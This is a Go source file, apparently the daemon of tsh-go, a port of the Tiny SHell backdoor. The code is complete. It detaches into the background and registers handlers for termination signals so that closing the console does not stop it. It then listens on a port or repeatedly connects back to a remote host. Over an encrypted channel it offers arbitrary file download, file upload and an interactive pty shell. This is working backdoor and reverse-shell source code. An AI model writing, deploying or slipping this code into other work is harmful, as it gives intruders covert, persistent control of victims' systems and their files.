package tshd

import (
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/pty"
	"tsh-go/internal/utils"
)

func RunInBackground() {
	fullpath, _ := filepath.Abs(os.Args[0])
	cmd := exec.Command(fullpath, os.Args[1:]...)
	cmd.Env = append(os.Environ(), "TSH_RUNNING_AS_DAEMON=1")
	cmd.Start()
}

func Run(secret string, host string, port int, delay int, runAsDaemon bool) {
	var isDaemon bool
	if os.Getenv("TSH_RUNNING_AS_DAEMON") == "1" {
		isDaemon = true
	}
	if runAsDaemon && !isDaemon {
		RunInBackground()
		os.Exit(0)
	}

	if runAsDaemon {
		// don't let system kill our child process after closing cmd.exe
		sigchan := make(chan os.Signal, 1)
		signal.Notify(sigchan,
			syscall.SIGINT,
			syscall.SIGTERM,
			syscall.SIGQUIT)
	}

	if host == "" {
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, true)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		for {
			layer, err := ln.Accept()
			if err == nil {
				go handleGeneric(layer)
			}
		}
	} else {
		// connect back mode
		addr := fmt.Sprintf("%s:%d", host, port)
		for {
			layer, err := pel.Dial(addr, secret, true)
			if err == nil {
				go handleGeneric(layer)
			}
			time.Sleep(time.Duration(delay) * time.Second)
		}
	}
}

// entry handler,
// automatically close connection after handling
// it's safe to run with goroutine
func handleGeneric(layer *pel.PktEncLayer) {
	defer layer.Close()
	defer func() {
		recover()
	}()
	buffer := make([]byte, 1)
	n, err := layer.Read(buffer)
	if err != nil || n != 1 {
		return
	}
	switch buffer[0] {
	case constants.GetFile:
		handleGetFile(layer)
	case constants.PutFile:
		handlePutFile(layer)
	case constants.RunShell:
		handleRunShell(layer)
	}
}

func handleGetFile(layer *pel.PktEncLayer) {
	buffer := make([]byte, constants.Bufsize)
	n, err := layer.Read(buffer)
	if err != nil {
		return
	}
	filename := string(buffer[:n])
	f, err := os.Open(filename)
	if err != nil {
		return
	}
	defer f.Close()
	utils.CopyBuffer(layer, f, buffer)
}

func handlePutFile(layer *pel.PktEncLayer) {
	buffer := make([]byte, constants.Bufsize)
	n, err := layer.Read(buffer)
	if err != nil {
		return
	}
	filename := filepath.FromSlash(string(buffer[:n]))
	f, err := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	utils.CopyBuffer(f, layer, buffer)
	layer.Close()
}

func handleRunShell(layer *pel.PktEncLayer) {
	buffer := make([]byte, constants.Bufsize)
	buffer2 := make([]byte, constants.Bufsize)

	n, err := layer.Read(buffer)
	if err != nil {
		return
	}
	term := string(buffer[:n])

	n, err = layer.Read(buffer[:4])
	if err != nil || n != 4 {
		return
	}
	ws_row := int(buffer[0])<<8 + int(buffer[1])
	ws_col := int(buffer[2])<<8 + int(buffer[3])

	n, err = layer.Read(buffer)
	if err != nil {
		return
	}
	command := string(buffer[:n])

	tp, err := pty.OpenPty(command, term, uint32(ws_col), uint32(ws_row))
	if err != nil {
		return
	}
	defer tp.Close()
	go func() {
		utils.CopyBuffer(tp.StdIn(), layer, buffer)
		tp.Close()
	}()
	utils.CopyBuffer(layer, tp.StdOut(), buffer2)
}
